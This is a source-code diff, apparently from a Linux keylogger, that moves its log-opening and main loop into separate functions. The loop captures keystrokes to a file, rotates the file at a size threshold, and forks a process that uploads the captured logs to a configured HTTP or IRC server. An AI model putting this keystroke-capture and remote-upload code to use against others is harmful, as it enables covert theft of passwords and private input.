@@ -481,6 +481,23 @@ bool update_key_state()
 }
 
 
+FILE* open_log_file()
+{
+  // open log file (if file doesn't exist, create it with safe 0600 permissions)
+  umask(0177);
+  FILE *out = NULL;
+  if (args.logfile == "-") {
+    out = stdout;
+  }
+  else {
+    out = fopen(args.logfile.c_str(), "a");
+  }
+  if (!out)
+    error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.logfile.c_str());
+  return out;
+}
+
+
 // Writes event to log file and returns the increased file size
 int log_event(FILE *out)
 {
@@ -533,6 +550,80 @@ int log_event(FILE *out)
 
   fflush(out);
   return inc_size;
+}
+
+
+// returns output file in case a new one was created so caller can close it properly
+void log_loop()
+{
+  char timestamp[32];  // timestamp string, long enough to hold format "\n%F %T%z > "
+  FILE *out = open_log_file();
+
+  struct stat st;
+  stat(args.logfile.c_str(), &st);
+  off_t file_size = st.st_size;  // log file is currently file_size bytes "big"
+
+  time_t cur_time;
+  time(&cur_time);
+  strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
+
+  if (args.flags & FLAG_NO_TIMESTAMPS)
+    file_size += fprintf(out, "Logging started at %s\n\n", timestamp);
+  else
+    file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
+  fflush(out);
+
+  // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
+  while (update_key_state()) {
+    int inc_size = log_event(out);
+    if (inc_size > 0) file_size += inc_size;
+
+    // if remote posting is enabled and size threshold is reached
+    if (args.post_size != 0 && file_size >= args.post_size && stat(UPLOADER_PID_FILE, &st) == -1) {
+      fclose(out);
+
+      std::stringstream ss;
+      for (int i = 1;; ++i) {
+        ss.clear();
+        ss.str("");
+        ss << args.logfile << "." << i;
+        struct stat st;
+        if (stat(ss.str().c_str(), &st) == -1) break;  // file .log.i doesn't yet exist
+      }
+
+      if (rename(args.logfile.c_str(), ss.str().c_str()) == -1)  // move current log file to indexed
+        error(EXIT_FAILURE, errno, "Error renaming logfile");
+
+      out = fopen(args.logfile.c_str(), "a");  // open empty log file with the same name
+      if (!out)
+        error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.logfile.c_str());
+
+      file_size = 0;  // new log file is now empty
+
+      // write new timestamp
+      time(&cur_time);
+      strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
+      if (args.flags & FLAG_NO_TIMESTAMPS)
+        file_size += fprintf(out, "Logging started at %s\n\n", timestamp);
+      else
+        file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
+
+      if (!args.http_url.empty() || !args.irc_server.empty()) {
+        switch (fork()) {
+        case -1: error(0, errno, "Error while forking remote-posting process");
+        case 0:
+          start_remote_upload();  // child process will upload the .log.i files
+          exit(EXIT_SUCCESS);
+        }
+      }
+    }
+  }
+
+  // append final timestamp, close files and exit
+  time(&cur_time);
+  strftime(timestamp, sizeof(timestamp), "%F %T%z", localtime(&cur_time));
+  fprintf(out, "\n\nLogging stopped at %s\n\n", timestamp);
+  fclose(out);
 }
 
 
@@ -607,18 +698,6 @@ int main(int argc, char **argv)
     seteuid(getuid());
     setegid(getgid());
   }
-  
-  // open log file (if file doesn't exist, create it with safe 0600 permissions)
-  umask(0177);
-  FILE *out = NULL;
-  if (args.logfile == "-") {
-    out = stdout;
-  }
-  else {
-    out = fopen(args.logfile.c_str(), "a");
-  }
-  if (!out)
-    error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.logfile.c_str());
 
   if (access(PID_FILE, F_OK) != -1)  // PID file already exists
     error(EXIT_FAILURE, errno, "Another process already running? Quitting. (" PID_FILE ")");
@@ -640,74 +719,8 @@ int main(int argc, char **argv)
   
   key_state.capslock_in_effect = execute(COMMAND_STR_CAPSLOCK_STATE).size() >= 2;
 
-  char timestamp[32];  // timestamp string, long enough to hold format "\n%F %T%z > "
-  
-  struct stat st;
-  stat(args.logfile.c_str(), &st);
-  off_t file_size = st.st_size;  // log file is currently file_size bytes "big"
-  
-  time_t cur_time;
-  time(&cur_time);
-  strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
-  
-  if (args.flags & FLAG_NO_TIMESTAMPS)
-    file_size += fprintf(out, "Logging started at %s\n\n", timestamp);
-  else
-    file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
-  fflush(out);
-  
-  // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
-  while (update_key_state()) {
-    int inc_size = log_event(out);
-    if (inc_size > 0) file_size += inc_size;
-    
-    // if remote posting is enabled and size threshold is reached
-    if (args.post_size != 0 && file_size >= args.post_size && stat(UPLOADER_PID_FILE, &st) == -1) {
-      fclose(out);
-      
-      std::stringstream ss;
-      for (int i = 1;; ++i) {
-        ss.clear();
-        ss.str("");
-        ss << args.logfile << "." << i;
-        if (stat(ss.str().c_str(), &st) == -1) break;  // file .log.i doesn't yet exist
-      }
-      
-      if (rename(args.logfile.c_str(), ss.str().c_str()) == -1)  // move current log file to indexed
-        error(EXIT_FAILURE, errno, "Error renaming logfile");
-      
-      out = fopen(args.logfile.c_str(), "a");  // open empty log file with the same name
-      if (!out)
-        error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.logfile.c_str());
-      
-      file_size = 0;  // new log file is now empty
-      
-      // write new timestamp
-      time(&cur_time);
-      strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
-      if (args.flags & FLAG_NO_TIMESTAMPS)
-        file_size += fprintf(out, "Logging started at %s\n\n", timestamp);
-      else
-        file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
-      
-      if (!args.http_url.empty() || !args.irc_server.empty()) {
-        switch (fork()) {
-        case -1: error(0, errno, "Error while forking remote-posting process");
-        case 0:  
-          start_remote_upload();  // child process will upload the .log.i files
-          exit(EXIT_SUCCESS);
-        }
-      }
-    }
-  }
+  log_loop();
 
-  // append final timestamp, close files and exit
-  time(&cur_time);
-  strftime(timestamp, sizeof(timestamp), "%F %T%z", localtime(&cur_time));
-  fprintf(out, "\n\nLogging stopped at %s\n\n", timestamp);
-  
-  fclose(out);
-  
   remove(PID_FILE);
   
   exit(EXIT_SUCCESS);
